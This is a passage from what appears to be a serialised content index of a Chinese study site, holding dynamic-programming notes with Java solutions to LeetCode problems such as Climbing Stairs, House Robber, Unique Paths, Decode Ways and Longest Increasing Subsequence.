2. \u77E9\u9635\u7684\u603B\u8DEF\u5F84\u6570 \u6570\u7EC4\u533A\u95F4 1. \u6570\u7EC4\u533A\u95F4\u548C
2. \u6570\u7EC4\u4E2D\u7B49\u5DEE\u9012\u589E\u5B50\u533A\u95F4\u7684\u4E2A\u6570 \u5206\u5272\u6574\u6570 1. \u5206\u5272\u6574\u6570\u7684\u6700\u5927\u4E58\u79EF
2. \u6309\u5E73\u65B9\u6570\u6765\u5206\u5272\u6574\u6570
3. \u5206\u5272\u6574\u6570\u6784\u6210\u5B57\u6BCD\u5B57\u7B26\u4E32 \u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217 1. \u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217
2. \u4E00\u7EC4\u6574\u6570\u5BF9\u80FD\u591F\u6784\u6210\u7684\u6700\u957F\u94FE
3. \u6700\u957F\u6446\u52A8\u5B50\u5E8F\u5217 \u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217 1. \u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217 0-1 \u80CC\u5305 1. \u5212\u5206\u6570\u7EC4\u4E3A\u548C\u76F8\u7B49\u7684\u4E24\u90E8\u5206
2. \u6539\u53D8\u4E00\u7EC4\u6570\u7684\u6B63\u8D1F\u53F7\u4F7F\u5F97\u5B83\u4EEC\u7684\u548C\u4E3A\u4E00\u7ED9\u5B9A\u6570
3. 01 \u5B57\u7B26\u6784\u6210\u6700\u591A\u7684\u5B57\u7B26\u4E32
4. \u627E\u96F6\u94B1\u7684\u6700\u5C11\u786C\u5E01\u6570
5. \u627E\u96F6\u94B1\u7684\u786C\u5E01\u6570\u7EC4\u5408
6. \u5B57\u7B26\u4E32\u6309\u5355\u8BCD\u5217\u8868\u5206\u5272
7. \u7EC4\u5408\u603B\u548C \u80A1\u7968\u4EA4\u6613 1. \u9700\u8981\u51B7\u5374\u671F\u7684\u80A1\u7968\u4EA4\u6613
2. \u9700\u8981\u4EA4\u6613\u8D39\u7528\u7684\u80A1\u7968\u4EA4\u6613
3. \u53EA\u80FD\u8FDB\u884C\u4E24\u6B21\u7684\u80A1\u7968\u4EA4\u6613
4. \u53EA\u80FD\u8FDB\u884C k \u6B21\u7684\u80A1\u7968\u4EA4\u6613 \u5B57\u7B26\u4E32\u7F16\u8F91 1. \u5220\u9664\u4E24\u4E2A\u5B57\u7B26\u4E32\u7684\u5B57\u7B26\u4F7F\u5B83\u4EEC\u76F8\u7B49
2. \u7F16\u8F91\u8DDD\u79BB
3. \u590D\u5236\u7C98\u8D34\u5B57\u7B26 \u9012\u5F52\u548C\u52A8\u6001\u89C4\u5212\u90FD\u662F\u5C06\u539F\u95EE\u9898\u62C6\u6210\u591A\u4E2A\u5B50\u95EE\u9898\u7136\u540E\u6C42\u89E3\uFF0C\u4ED6\u4EEC\u4E4B\u95F4\u6700\u672C\u8D28\u7684\u533A\u522B\u662F\uFF0C\u52A8\u6001\u89C4\u5212\u4FDD\u5B58\u4E86\u5B50\u95EE\u9898\u7684\u89E3\uFF0C\u907F\u514D\u91CD\u590D\u8BA1\u7B97\u3002`},{header:"\u6590\u6CE2\u90A3\u5951\u6570\u5217",slug:"\u6590\u6CE2\u90A3\u5951\u6570\u5217",content:""},{header:"1. \u722C\u697C\u68AF",slug:"_1-\u722C\u697C\u68AF",content:`70. Climbing Stairs (Easy)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6709 N \u9636\u697C\u68AF\uFF0C\u6BCF\u6B21\u53EF\u4EE5\u4E0A\u4E00\u9636\u6216\u8005\u4E24\u9636\uFF0C\u6C42\u6709\u591A\u5C11\u79CD\u4E0A\u697C\u68AF\u7684\u65B9\u6CD5\u3002
\u5B9A\u4E49\u4E00\u4E2A\u6570\u7EC4 dp \u5B58\u50A8\u4E0A\u697C\u68AF\u7684\u65B9\u6CD5\u6570\uFF08\u4E3A\u4E86\u65B9\u4FBF\u8BA8\u8BBA\uFF0C\u6570\u7EC4\u4E0B\u6807\u4ECE 1 \u5F00\u59CB\uFF09\uFF0Cdp[i] \u8868\u793A\u8D70\u5230\u7B2C i \u4E2A\u697C\u68AF\u7684\u65B9\u6CD5\u6570\u76EE\u3002
\u7B2C i \u4E2A\u697C\u68AF\u53EF\u4EE5\u4ECE\u7B2C i-1 \u548C i-2 \u4E2A\u697C\u68AF\u518D\u8D70\u4E00\u6B65\u5230\u8FBE\uFF0C\u8D70\u5230\u7B2C i \u4E2A\u697C\u68AF\u7684\u65B9\u6CD5\u6570\u4E3A\u8D70\u5230\u7B2C i-1 \u548C\u7B2C i-2 \u4E2A\u697C\u68AF\u7684\u65B9\u6CD5\u6570\u4E4B\u548C\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/14fe1e71-8518-458f-a220-116003061a83.png" width="200px">
\u8003\u8651\u5230 dp[i] \u53EA\u4E0E dp[i - 1] \u548C dp[i - 2] \u6709\u5173\uFF0C\u56E0\u6B64\u53EF\u4EE5\u53EA\u7528\u4E24\u4E2A\u53D8\u91CF\u6765\u5B58\u50A8 dp[i - 1] \u548C dp[i - 2]\uFF0C\u4F7F\u5F97\u539F\u6765\u7684 O(N) \u7A7A\u95F4\u590D\u6742\u5EA6\u4F18\u5316\u4E3A O(1) \u590D\u6742\u5EA6\u3002
public int climbStairs(int n) { if (n <= 2) { return n; } int pre2 = 1, pre1 = 2; for (int i = 2; i < n; i++) { int cur = pre1 + pre2; pre2 = pre1; pre1 = cur; } return pre1;
}`},{header:"2. \u5F3A\u76D7\u62A2\u52AB",slug:"_2-\u5F3A\u76D7\u62A2\u52AB",content:`198. House Robber (Easy)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u62A2\u52AB\u4E00\u6392\u4F4F\u6237\uFF0C\u4F46\u662F\u4E0D\u80FD\u62A2\u90BB\u8FD1\u7684\u4F4F\u6237\uFF0C\u6C42\u6700\u5927\u62A2\u52AB\u91CF\u3002
\u5B9A\u4E49 dp \u6570\u7EC4\u7528\u6765\u5B58\u50A8\u6700\u5927\u7684\u62A2\u52AB\u91CF\uFF0C\u5176\u4E2D dp[i] \u8868\u793A\u62A2\u5230\u7B2C i \u4E2A\u4F4F\u6237\u65F6\u7684\u6700\u5927\u62A2\u52AB\u91CF\u3002
\u7531\u4E8E\u4E0D\u80FD\u62A2\u52AB\u90BB\u8FD1\u4F4F\u6237\uFF0C\u5982\u679C\u62A2\u52AB\u4E86\u7B2C i -1 \u4E2A\u4F4F\u6237\uFF0C\u90A3\u4E48\u5C31\u4E0D\u80FD\u518D\u62A2\u52AB\u7B2C i \u4E2A\u4F4F\u6237\uFF0C\u6240\u4EE5 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2de794ca-aa7b-48f3-a556-a0e2708cb976.jpg" width="350px">
public int rob(int[] nums) { int pre2 = 0, pre1 = 0; for (int i = 0; i < nums.length; i++) { int cur = Math.max(pre2 + nums[i], pre1); pre2 = pre1; pre1 = cur; } return pre1;
}`},{header:"3. \u5F3A\u76D7\u5728\u73AF\u5F62\u8857\u533A\u62A2\u52AB",slug:"_3-\u5F3A\u76D7\u5728\u73AF\u5F62\u8857\u533A\u62A2\u52AB",content:`213. House Robber II (Medium)
Leetcode / \u529B\u6263
public int rob(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int n = nums.length; if (n == 1) { return nums[0]; } return Math.max(rob(nums, 0, n - 2), rob(nums, 1, n - 1));
} private int rob(int[] nums, int first, int last) { int pre2 = 0, pre1 = 0; for (int i = first; i <= last; i++) { int cur = Math.max(pre1, pre2 + nums[i]); pre2 = pre1; pre1 = cur; } return pre1;
}`},{header:"4. \u4FE1\u4EF6\u9519\u6392",slug:"_4-\u4FE1\u4EF6\u9519\u6392",content:`\u9898\u76EE\u63CF\u8FF0\uFF1A\u6709 N \u4E2A \u4FE1 \u548C \u4FE1\u5C01\uFF0C\u5B83\u4EEC\u88AB\u6253\u4E71\uFF0C\u6C42\u9519\u8BEF\u88C5\u4FE1\u65B9\u5F0F\u7684\u6570\u91CF\u3002
\u5B9A\u4E49\u4E00\u4E2A\u6570\u7EC4 dp \u5B58\u50A8\u9519\u8BEF\u65B9\u5F0F\u6570\u91CF\uFF0Cdp[i] \u8868\u793A\u524D i \u4E2A\u4FE1\u548C\u4FE1\u5C01\u7684\u9519\u8BEF\u65B9\u5F0F\u6570\u91CF\u3002\u5047\u8BBE\u7B2C i \u4E2A\u4FE1\u88C5\u5230\u7B2C j \u4E2A\u4FE1\u5C01\u91CC\u9762\uFF0C\u800C\u7B2C j \u4E2A\u4FE1\u88C5\u5230\u7B2C k \u4E2A\u4FE1\u5C01\u91CC\u9762\u3002\u6839\u636E i \u548C k \u662F\u5426\u76F8\u7B49\uFF0C\u6709\u4E24\u79CD\u60C5\u51B5\uFF1A i==k\uFF0C\u4EA4\u6362 i \u548C j \u7684\u4FE1\u540E\uFF0C\u5B83\u4EEC\u7684\u4FE1\u548C\u4FE1\u5C01\u5728\u6B63\u786E\u7684\u4F4D\u7F6E\uFF0C\u4F46\u662F\u5176\u4F59 i-2 \u5C01\u4FE1\u6709 dp[i-2] \u79CD\u9519\u8BEF\u88C5\u4FE1\u7684\u65B9\u5F0F\u3002\u7531\u4E8E j \u6709 i-1 \u79CD\u53D6\u503C\uFF0C\u56E0\u6B64\u5171\u6709 (i-1)*dp[i-2] \u79CD\u9519\u8BEF\u88C5\u4FE1\u65B9\u5F0F\u3002
i != k\uFF0C\u4EA4\u6362 i \u548C j \u7684\u4FE1\u540E\uFF0C\u7B2C i \u4E2A\u4FE1\u548C\u4FE1\u5C01\u5728\u6B63\u786E\u7684\u4F4D\u7F6E\uFF0C\u5176\u4F59 i-1 \u5C01\u4FE1\u6709 dp[i-1] \u79CD\u9519\u8BEF\u88C5\u4FE1\u65B9\u5F0F\u3002\u7531\u4E8E j \u6709 i-1 \u79CD\u53D6\u503C\uFF0C\u56E0\u6B64\u5171\u6709 (i-1)*dp[i-1] \u79CD\u9519\u8BEF\u88C5\u4FE1\u65B9\u5F0F\u3002 \u7EFC\u4E0A\u6240\u8FF0\uFF0C\u9519\u8BEF\u88C5\u4FE1\u6570\u91CF\u65B9\u5F0F\u6570\u91CF\u4E3A\uFF1A ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/da1f96b9-fd4d-44ca-8925-fb14c5733388.png" width="350px">`},{header:"5. \u6BCD\u725B\u751F\u4EA7",slug:"_5-\u6BCD\u725B\u751F\u4EA7",content:`\u7A0B\u5E8F\u5458\u4EE3\u7801\u9762\u8BD5\u6307\u5357-P181
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5047\u8BBE\u519C\u573A\u4E2D\u6210\u719F\u7684\u6BCD\u725B\u6BCF\u5E74\u90FD\u4F1A\u751F 1 \u5934\u5C0F\u6BCD\u725B\uFF0C\u5E76\u4E14\u6C38\u8FDC\u4E0D\u4F1A\u6B7B\u3002\u7B2C\u4E00\u5E74\u6709 1 \u53EA\u5C0F\u6BCD\u725B\uFF0C\u4ECE\u7B2C\u4E8C\u5E74\u5F00\u59CB\uFF0C\u6BCD\u725B\u5F00\u59CB\u751F\u5C0F\u6BCD\u725B\u3002\u6BCF\u53EA\u5C0F\u6BCD\u725B 3 \u5E74\u4E4B\u540E\u6210\u719F\u53C8\u53EF\u4EE5\u751F\u5C0F\u6BCD\u725B\u3002\u7ED9\u5B9A\u6574\u6570 N\uFF0C\u6C42 N \u5E74\u540E\u725B\u7684\u6570\u91CF\u3002
\u7B2C i \u5E74\u6210\u719F\u7684\u725B\u7684\u6570\u91CF\u4E3A\uFF1A ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/879814ee-48b5-4bcb-86f5-dcc400cb81ad.png" width="250px">`},{header:"\u77E9\u9635\u8DEF\u5F84",slug:"\u77E9\u9635\u8DEF\u5F84",content:""},{header:"1. \u77E9\u9635\u7684\u6700\u5C0F\u8DEF\u5F84\u548C",slug:"_1-\u77E9\u9635\u7684\u6700\u5C0F\u8DEF\u5F84\u548C",content:`64. Minimum Path Sum (Medium)
Leetcode / \u529B\u6263
[[1,3,1], [1,5,1], [4,2,1]]
Given the above grid map, return 7. Because the path 1\u21923\u21921\u21921\u21921 minimizes the sum.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6C42\u4ECE\u77E9\u9635\u7684\u5DE6\u4E0A\u89D2\u5230\u53F3\u4E0B\u89D2\u7684\u6700\u5C0F\u8DEF\u5F84\u548C\uFF0C\u6BCF\u6B21\u53EA\u80FD\u5411\u53F3\u548C\u5411\u4E0B\u79FB\u52A8\u3002
public int minPathSum(int[][] grid) { if (grid.length == 0 || grid[0].length == 0) { return 0; } int m = grid.length, n = grid[0].length; int[] dp = new int[n]; for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (j == 0) { dp[j] = dp[j]; // \u53EA\u80FD\u4ECE\u4E0A\u4FA7\u8D70\u5230\u8BE5\u4F4D\u7F6E } else if (i == 0) { dp[j] = dp[j - 1]; // \u53EA\u80FD\u4ECE\u5DE6\u4FA7\u8D70\u5230\u8BE5\u4F4D\u7F6E } else { dp[j] = Math.min(dp[j - 1], dp[j]); } dp[j] += grid[i][j]; } } return dp[n - 1];
}`},{header:"2. \u77E9\u9635\u7684\u603B\u8DEF\u5F84\u6570",slug:"_2-\u77E9\u9635\u7684\u603B\u8DEF\u5F84\u6570",content:`62. Unique Paths (Medium)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u7EDF\u8BA1\u4ECE\u77E9\u9635\u5DE6\u4E0A\u89D2\u5230\u53F3\u4E0B\u89D2\u7684\u8DEF\u5F84\u603B\u6570\uFF0C\u6BCF\u6B21\u53EA\u80FD\u5411\u53F3\u6216\u8005\u5411\u4E0B\u79FB\u52A8\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc82f0f3-c1d4-4ac8-90ac-d5b32a9bd75a.jpg" width="">
public int uniquePaths(int m, int n) { int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i < m; i++) { for (int j = 1; j < n; j++) { dp[j] = dp[j] + dp[j - 1]; } } return dp[n - 1];
}
\u4E5F\u53EF\u4EE5\u76F4\u63A5\u7528\u6570\u5B66\u516C\u5F0F\u6C42\u89E3\uFF0C\u8FD9\u662F\u4E00\u4E2A\u7EC4\u5408\u95EE\u9898\u3002\u673A\u5668\u4EBA\u603B\u5171\u79FB\u52A8\u7684\u6B21\u6570 S=m+n-2\uFF0C\u5411\u4E0B\u79FB\u52A8\u7684\u6B21\u6570 D=m-1\uFF0C\u90A3\u4E48\u95EE\u9898\u53EF\u4EE5\u770B\u6210\u4ECE S \u4E2D\u53D6\u51FA D \u4E2A\u4F4D\u7F6E\u7684\u7EC4\u5408\u6570\u91CF\uFF0C\u8FD9\u4E2A\u95EE\u9898\u7684\u89E3\u4E3A C(S, D)\u3002
public int uniquePaths(int m, int n) { int S = m + n - 2; // \u603B\u5171\u7684\u79FB\u52A8\u6B21\u6570 int D = m - 1; // \u5411\u4E0B\u7684\u79FB\u52A8\u6B21\u6570 long ret = 1; for (int i = 1; i <= D; i++) { ret = ret * (S - D + i) / i; } return (int) ret;
}`},{header:"\u6570\u7EC4\u533A\u95F4",slug:"\u6570\u7EC4\u533A\u95F4",content:""},{header:"1. \u6570\u7EC4\u533A\u95F4\u548C",slug:"_1-\u6570\u7EC4\u533A\u95F4\u548C",content:`303. Range Sum Query - Immutable (Easy)
Leetcode / \u529B\u6263
Given nums = [-2, 0, 3, -5, 2, -1] sumRange(0, 2) -> 1
sumRange(2, 5) -> -1
sumRange(0, 5) -> -3
\u6C42\u533A\u95F4 i ~ j \u7684\u548C\uFF0C\u53EF\u4EE5\u8F6C\u6362\u4E3A sum[j + 1] - sum[i]\uFF0C\u5176\u4E2D sum[i] \u4E3A 0 ~ i - 1 \u7684\u548C\u3002
class NumArray { private int[] sums; public NumArray(int[] nums) { sums = new int[nums.length + 1]; for (int i = 1; i <= nums.length; i++) { sums[i] = sums[i - 1] + nums[i - 1]; } } public int sumRange(int i, int j) { return sums[j + 1] - sums[i]; }
}`},{header:"2. \u6570\u7EC4\u4E2D\u7B49\u5DEE\u9012\u589E\u5B50\u533A\u95F4\u7684\u4E2A\u6570",slug:"_2-\u6570\u7EC4\u4E2D\u7B49\u5DEE\u9012\u589E\u5B50\u533A\u95F4\u7684\u4E2A\u6570",content:`413. Arithmetic Slices (Medium)
Leetcode / \u529B\u6263
A = [0, 1, 2, 3, 4] return: 6, for 3 arithmetic slices in A: [0, 1, 2],
[1, 2, 3],
[0, 1, 2, 3],
[0, 1, 2, 3, 4],
[ 1, 2, 3, 4],
[2, 3, 4]
dp[i] \u8868\u793A\u4EE5 A[i] \u4E3A\u7ED3\u5C3E\u7684\u7B49\u5DEE\u9012\u589E\u5B50\u533A\u95F4\u7684\u4E2A\u6570\u3002
\u5F53 A[i] - A[i-1] == A[i-1] - A[i-2]\uFF0C\u90A3\u4E48 [A[i-2], A[i-1], A[i]] \u6784\u6210\u4E00\u4E2A\u7B49\u5DEE\u9012\u589E\u5B50\u533A\u95F4\u3002\u800C\u4E14\u5728\u4EE5 A[i-1] \u4E3A\u7ED3\u5C3E\u7684\u9012\u589E\u5B50\u533A\u95F4\u7684\u540E\u9762\u518D\u52A0\u4E0A\u4E00\u4E2A A[i]\uFF0C\u4E00\u6837\u53EF\u4EE5\u6784\u6210\u65B0\u7684\u9012\u589E\u5B50\u533A\u95F4\u3002
dp[2] = 1 [0, 1, 2]
dp[3] = dp[2] + 1 = 2 [0, 1, 2, 3], // [0, 1, 2] \u4E4B\u540E\u52A0\u4E00\u4E2A 3 [1, 2, 3] // \u65B0\u7684\u9012\u589E\u5B50\u533A\u95F4
dp[4] = dp[3] + 1 = 3 [0, 1, 2, 3, 4], // [0, 1, 2, 3] \u4E4B\u540E\u52A0\u4E00\u4E2A 4 [1, 2, 3, 4], // [1, 2, 3] \u4E4B\u540E\u52A0\u4E00\u4E2A 4 [2, 3, 4] // \u65B0\u7684\u9012\u589E\u5B50\u533A\u95F4
\u7EFC\u4E0A\uFF0C\u5728 A[i] - A[i-1] == A[i-1] - A[i-2] \u65F6\uFF0Cdp[i] = dp[i-1] + 1\u3002
\u56E0\u4E3A\u9012\u589E\u5B50\u533A\u95F4\u4E0D\u4E00\u5B9A\u4EE5\u6700\u540E\u4E00\u4E2A\u5143\u7D20\u4E3A\u7ED3\u5C3E\uFF0C\u53EF\u4EE5\u662F\u4EFB\u610F\u4E00\u4E2A\u5143\u7D20\u7ED3\u5C3E\uFF0C\u56E0\u6B64\u9700\u8981\u8FD4\u56DE dp \u6570\u7EC4\u7D2F\u52A0\u7684\u7ED3\u679C\u3002
public int numberOfArithmeticSlices(int[] A) { if (A == null || A.length == 0) { return 0; } int n = A.length; int[] dp = new int[n]; for (int i = 2; i < n; i++) { if (A[i] - A[i - 1] == A[i - 1] - A[i - 2]) { dp[i] = dp[i - 1] + 1; } } int total = 0; for (int cnt : dp) { total += cnt; } return total;
}`},{header:"\u5206\u5272\u6574\u6570",slug:"\u5206\u5272\u6574\u6570",content:""},{header:"1. \u5206\u5272\u6574\u6570\u7684\u6700\u5927\u4E58\u79EF",slug:"_1-\u5206\u5272\u6574\u6570\u7684\u6700\u5927\u4E58\u79EF",content:`343. Integer Break (Medim)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1AFor example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4).
public int integerBreak(int n) { int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i <= n; i++) { for (int j = 1; j <= i - 1; j++) { dp[i] = Math.max(dp[i], Math.max(j * dp[i - j], j * (i - j))); } } return dp[n];
}`},{header:"2. \u6309\u5E73\u65B9\u6570\u6765\u5206\u5272\u6574\u6570",slug:"_2-\u6309\u5E73\u65B9\u6570\u6765\u5206\u5272\u6574\u6570",content:`279. Perfect Squares(Medium)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1AFor example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9.
public int numSquares(int n) { List<Integer> squareList = generateSquareList(n); int[] dp = new int[n + 1]; for (int i = 1; i <= n; i++) { int min = Integer.MAX_VALUE; for (int square : squareList) { if (square > i) { break; } min = Math.min(min, dp[i - square] + 1); } dp[i] = min; } return dp[n];
} private List<Integer> generateSquareList(int n) { List<Integer> squareList = new ArrayList<>(); int diff = 3; int square = 1; while (square <= n) { squareList.add(square); square += diff; diff += 2; } return squareList;
}`},{header:"3. \u5206\u5272\u6574\u6570\u6784\u6210\u5B57\u6BCD\u5B57\u7B26\u4E32",slug:"_3-\u5206\u5272\u6574\u6570\u6784\u6210\u5B57\u6BCD\u5B57\u7B26\u4E32",content:`91. Decode Ways (Medium)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1AGiven encoded message "12", it could be decoded as "AB" (1 2) or "L" (12).
public int numDecodings(String s) { if (s == null || s.length() == 0) { return 0; } int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == '0' ? 0 : 1; for (int i = 2; i <= n; i++) { int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) { dp[i] += dp[i - 1]; } if (s.charAt(i - 2) == '0') { continue; } int two = Integer.valueOf(s.substring(i - 2, i)); if (two <= 26) { dp[i] += dp[i - 2]; } } return dp[n];
}`},{header:"\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217",slug:"\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217",content:`\u5DF2\u77E5\u4E00\u4E2A\u5E8F\u5217 {S1, S2,...,Sn}\uFF0C\u53D6\u51FA\u82E5\u5E72\u6570\u7EC4\u6210\u65B0\u7684\u5E8F\u5217 {Si1, Si2,..., Sim}\uFF0C\u5176\u4E2D i1\u3001i2 ... im \u4FDD\u6301\u9012\u589E\uFF0C\u5373\u65B0\u5E8F\u5217\u4E2D\u5404\u4E2A\u6570\u4ECD\u7136\u4FDD\u6301\u539F\u6570\u5217\u4E2D\u7684\u5148\u540E\u987A\u5E8F\uFF0C\u79F0\u65B0\u5E8F\u5217\u4E3A\u539F\u5E8F\u5217\u7684\u4E00\u4E2A \u5B50\u5E8F\u5217 \u3002
\u5982\u679C\u5728\u5B50\u5E8F\u5217\u4E2D\uFF0C\u5F53\u4E0B\u6807 ix > iy \u65F6\uFF0CSix > Siy\uFF0C\u79F0\u5B50\u5E8F\u5217\u4E3A\u539F\u5E8F\u5217\u7684\u4E00\u4E2A \u9012\u589E\u5B50\u5E8F\u5217 \u3002
\u5B9A\u4E49\u4E00\u4E2A\u6570\u7EC4 dp \u5B58\u50A8\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u7684\u957F\u5EA6\uFF0Cdp[n] \u8868\u793A\u4EE5 Sn \u7ED3\u5C3E\u7684\u5E8F\u5217\u7684\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u957F\u5EA6\u3002\u5BF9\u4E8E\u4E00\u4E2A\u9012\u589E\u5B50\u5E8F\u5217 {Si1, Si2,...,Sim}\uFF0C\u5982\u679C im < n \u5E76\u4E14 Sim < Sn\uFF0C\u6B64\u65F6 {Si1, Si2,..., Sim, Sn} \u4E3A\u4E00\u4E2A\u9012\u589E\u5B50\u5E8F\u5217\uFF0C\u9012\u589E\u5B50\u5E8F\u5217\u7684\u957F\u5EA6\u589E\u52A0 1\u3002\u6EE1\u8DB3\u4E0A\u8FF0\u6761\u4EF6\u7684\u9012\u589E\u5B50\u5E8F\u5217\u4E2D\uFF0C\u957F\u5EA6\u6700\u957F\u7684\u90A3\u4E2A\u9012\u589E\u5B50\u5E8F\u5217\u5C31\u662F\u8981\u627E\u7684\uFF0C\u5728\u957F\u5EA6\u6700\u957F\u7684\u9012\u589E\u5B50\u5E8F\u5217\u4E0A\u52A0\u4E0A Sn \u5C31\u6784\u6210\u4E86\u4EE5 Sn \u4E3A\u7ED3\u5C3E\u7684\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u3002\u56E0\u6B64 dp[n] = max{ dp[i]+1 | Si < Sn && i < n} \u3002
\u56E0\u4E3A\u5728\u6C42 dp[n] \u65F6\u53EF\u80FD\u65E0\u6CD5\u627E\u5230\u4E00\u4E2A\u6EE1\u8DB3\u6761\u4EF6\u7684\u9012\u589E\u5B50\u5E8F\u5217\uFF0C\u6B64\u65F6 {Sn} \u5C31\u6784\u6210\u4E86\u9012\u589E\u5B50\u5E8F\u5217\uFF0C\u9700\u8981\u5BF9\u524D\u9762\u7684\u6C42\u89E3\u65B9\u7A0B\u505A\u4FEE\u6539\uFF0C\u4EE4 dp[n] \u6700\u5C0F\u4E3A 1\uFF0C\u5373\uFF1A ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ee994da4-0fc7-443d-ac56-c08caf00a204.jpg" width="350px">
\u5BF9\u4E8E\u4E00\u4E2A\u957F\u5EA6\u4E3A N \u7684\u5E8F\u5217\uFF0C\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u5E76\u4E0D\u4E00\u5B9A\u4F1A\u4EE5 SN \u4E3A\u7ED3\u5C3E\uFF0C\u56E0\u6B64 dp[N] \u4E0D\u662F\u5E8F\u5217\u7684\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u7684\u957F\u5EA6\uFF0C\u9700\u8981\u904D\u5386 dp \u6570\u7EC4\u627E\u51FA\u6700\u5927\u503C\u624D\u662F\u6240\u8981\u7684\u7ED3\u679C\uFF0Cmax{ dp[i] | 1 <= i <= N} \u5373\u4E3A\u6240\u6C42\u3002`},{header:"1. \u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217",slug:"_1-\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217",content:`300. Longest Increasing Subsequence (Medium)
Leetcode / \u529B\u6263
public int lengthOfLIS(int[] nums) { int n = nums.length; int[] dp = new int[n]; for (int i = 0; i < n; i++) { int max = 1; for (int j = 0; j < i; j++) { if (nums[i] > nums[j]) { max = Math.max(max, dp[j] + 1); } } dp[i] = max; } return Arrays.stream(dp).max().orElse(0);
}
\u4F7F\u7528 Stream \u6C42\u6700\u5927\u503C\u4F1A\u5BFC\u81F4\u8FD0\u884C\u65F6\u95F4\u8FC7\u957F\uFF0C\u53EF\u4EE5\u6539\u6210\u4EE5\u4E0B\u5F62\u5F0F\uFF1A
int ret = 0;
for (int i = 0; i < n; i++) { ret = Math.max(ret, dp[i]);
}
return ret;
\u4EE5\u4E0A\u89E3\u6CD5\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N2)\uFF0C\u53EF\u4EE5\u4F7F\u7528\u4E8C\u5206\u67E5\u627E\u5C06\u65F6\u95F4\u590D\u6742\u5EA6\u964D\u4F4E\u4E3A O(NlogN)\u3002
\u5B9A\u4E49\u4E00\u4E2A tails \u6570\u7EC4\uFF0C\u5176\u4E2D tails[i] \u5B58\u50A8\u957F\u5EA6\u4E3A i + 1 \u7684\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u7684\u6700\u540E\u4E00\u4E2A\u5143\u7D20\u3002\u5BF9\u4E8E\u4E00\u4E2A\u5143\u7D20 x\uFF0C \u5982\u679C\u5B83\u5927\u4E8E tails \u6570\u7EC4\u6240\u6709\u7684\u503C\uFF0C\u90A3\u4E48\u628A\u5B83\u6DFB\u52A0\u5230 tails \u540E\u9762\uFF0C\u8868\u793A\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u957F\u5EA6\u52A0 1\uFF1B
\u5982\u679C tails[i-1] < x <= tails[i]\uFF0C\u90A3\u4E48\u66F4\u65B0 tails[i] = x\u3002 \u4F8B\u5982\u5BF9\u4E8E\u6570\u7EC4 [4,3,6,5]\uFF0C\u6709\uFF1A
tails len num
[] 0 4
[4] 1 3
[3] 1 6
[3,6] 2 5
[3,5] 2 null
\u53EF\u4EE5\u770B\u51FA tails \u6570\u7EC4\u4FDD\u6301\u6709\u5E8F\uFF0C\u56E0\u6B64\u5728\u67E5\u627E Si \u4F4D\u4E8E tails \u6570\u7EC4\u7684\u4F4D\u7F6E\u65F6\u5C31\u53EF\u4EE5\u4F7F\u7528\u4E8C\u5206\u67E5\u627E\u3002
public int lengthOfLIS(int[] nums) { int n = nums.length; int[] tails = new int[n]; int len = 0; for (int num : nums) { int index = binarySearch(tails, len, num); tails[index] = num; if (index == len) { len++; } } return len;
} private int binarySearch(int[] tails, int len, int key) { int l = 0, h = len; while (l < h) { int mid = l + (h - l) / 2; if (tails[mid] == key) { return mid; } else if (tails[mid] > key) { h = mid; } else { l = mid + 1; } } return l;
}`},{header:"2. \u4E00\u7EC4\u6574\u6570\u5BF9\u80FD\u591F\u6784\u6210\u7684\u6700\u957F\u94FE",slug:"_2-\u4E00\u7EC4\u6574\u6570\u5BF9\u80FD\u591F\u6784\u6210\u7684\u6700\u957F\u94FE",content:`646. Maximum Length of Pair Chain (Medium)
Leetcode / \u529B\u6263
Input: [[1,2], [2,3], [3,4]]
Output: 2
Explanation: The longest chain is [1,2] -> [3,4]
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5BF9\u4E8E (a, b) \u548C (c, d) \uFF0C\u5982\u679C b < c\uFF0C\u5219\u5B83\u4EEC\u53EF\u4EE5\u6784\u6210\u4E00\u6761\u94FE\u3002
